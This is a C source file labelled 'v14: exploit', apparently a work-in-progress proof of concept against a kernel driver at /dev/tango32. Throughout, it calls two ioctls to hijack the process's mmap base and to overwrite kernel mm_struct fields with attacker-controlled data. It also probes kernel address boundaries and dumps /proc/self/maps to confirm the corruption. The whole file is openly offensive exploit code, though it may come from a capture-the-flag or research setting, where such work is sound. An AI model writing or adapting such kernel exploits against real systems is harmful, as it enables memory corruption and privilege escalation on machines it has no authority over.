/* v14: exploit — use 0x74a2 to hijack mmap base, then mmap overwrite target */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/resource.h>

#define DEV "/dev/tango32"
#define TANGO_SET_MMAP_BASE  0x000074a2
#define TANGO_MMAP_DATA      0x406874a1

struct tango_mmap_data {
    unsigned long ptrs[10];
    unsigned long extra_ptr;
    unsigned long extra_size;
    unsigned long padding;
};

/* 0x406874a1 — same as v2/v12, payload on stack */
static int do_406874a1(int fd, unsigned long base, int size) {
    struct tango_mmap_data d;
    memset(&d, 0, sizeof(d));
    
    /* alloc 10 real user addresses for ptrs */
    void *ptrs[10];
    for (int i = 0; i < 10; i++)
        ptrs[i] = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
                       MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    
    for (int i = 0; i < 10; i++)
        d.ptrs[i] = (unsigned long)ptrs[i];
    
    d.extra_ptr = (unsigned long)&d;  /* stack address */
    d.extra_size = size;
    d.padding = 0;
    
    int ret = ioctl(fd, TANGO_MMAP_DATA, &d);
    
    for (int i = 0; i < 10; i++)
        munmap(ptrs[i], 0x1000);
    
    return ret;
}

static int do_74a2(int fd, unsigned long addr) {
    return ioctl(fd, TANGO_SET_MMAP_BASE, addr);
}

int main(void) {
    int fd = open(DEV, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }
    printf("fd=%d\n\n", fd);
    
    /* Phase 0: baseline — where does mmap normally return? */
    void *b = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
                   MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    printf("=== Phase 0: baseline ===\n");
    printf("baseline mmap = %p\n\n", b);
    
    /* Phase 1: test kernel memory range attempts */
    printf("=== Phase 1: probe kernel boundary ===\n");
    
    /* The boundary depends on flags bit22.  Try 0x74a2 with various values */
    unsigned long probes[] = {
        0x1000,                    /* min valid */
        0x7000000000,              /* user ok */
        0x7fffffffffff,            /* top of user */
        0x8000000000,              /* boundary when bit22=1 */
        0xffffffffff000,           /* just below 0xfffff000 */
        0x1000000000000ULL,        /* >48 bit */
    };
    
    for (int i = 0; i < 6; i++) {
        int r = do_74a2(fd, probes[i]);
        printf("  0x74a2(0x%lx) = %d errno=%d\n", probes[i], r, errno);
    }
    printf("\n");
    
    /* Phase 2: 0x74a2 to a valid user address, then set up mm_struct via 0x406874a1 */
    printf("=== Phase 2: setup mm_struct ===\n");
    int r = do_74a2(fd, 0x7000000000);
    printf("  0x74a2(0x7000000000) = %d\n", r);
    
    /* Read the global first (optional, confirms module state) */
    /* v2 does 0x800474a0 but we skip it — not needed */
    
    /* 0x406874a1 — overwrite mm+0x190 with controlled data */
    r = do_406874a1(fd, 0x6ffff00000, 400);
    printf("  0x406874a1(s=400) = %d errno=%d\n", r, errno);
    
    /* Phase 3: try mmap at a known target address */
    printf("\n=== Phase 3: mmap at target ===\n");
    
    /* First, set mmap base to a region we know is writable */
    /* The POC binary's own data segment?  Let's try mapping right after it */
    /* Actually, let's probe what 0x74a2 actually controls */
    
    /* After all ioctls, see where mmap goes */
    void *p1 = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
                    MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    printf("  mmap #1 after ioctls = %p\n", p1);
    
    /* Try with MAP_FIXED hints?  No, we can't use MAP_FIXED yet.
       The actual attack vector: 0x74a2 changes mm_struct->mmap_base
       which biases ALL future mmap allocations.
       
       Let's dump proof: allocate several pages and see the pattern */
    void *pages[10];
    for (int i = 0; i < 10; i++) {
        pages[i] = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
                        MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
        printf("  mmap[%d] = %p (delta from baseline: %ld)\n",
               i, pages[i], (long)pages[i] - (long)b);
    }
    
    /* Phase 4: write /proc/self/maps to inspect */
    printf("\n=== Phase 4: dump maps ===\n");
    system("cat /proc/self/maps | grep -E '\\[anon\\]|\\[stack\\]|\\[vdso\\]|tango32_poc' | head -20");
    
    /* Cleanup */
    for (int i = 0; i < 10; i++)
        munmap(pages[i], 0x1000);
    if (p1) munmap(p1, 0x1000);
    if (b) munmap(b, 0x1000);
    
    close(fd);
    printf("\n=== Done ===\n");
    return 0;
}
